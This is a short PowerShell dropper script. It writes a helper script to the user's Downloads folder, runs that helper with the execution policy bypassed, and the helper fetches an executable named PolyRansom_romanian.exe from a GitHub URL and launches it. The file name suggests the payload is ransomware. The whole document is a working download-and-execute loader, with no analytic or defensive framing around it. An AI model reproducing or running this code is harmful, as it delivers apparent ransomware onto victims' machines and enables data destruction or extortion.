$scriptContent = @"
\$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
\$downloadPath = Join-Path \$env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
\$webClient = New-Object System.Net.WebClient
\$webClient.DownloadFile(\$url, \$downloadPath)
if (Test-Path \$downloadPath) {
    Start-Process -FilePath \$downloadPath -Wait
    exit
} else {
    Write-Host "Download failed."
}
"@

$scriptPath = Join-Path $env:USERPROFILE "Downloads\download_and_run.ps1"

$scriptContent | Out-File -FilePath $scriptPath -Encoding ascii

Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
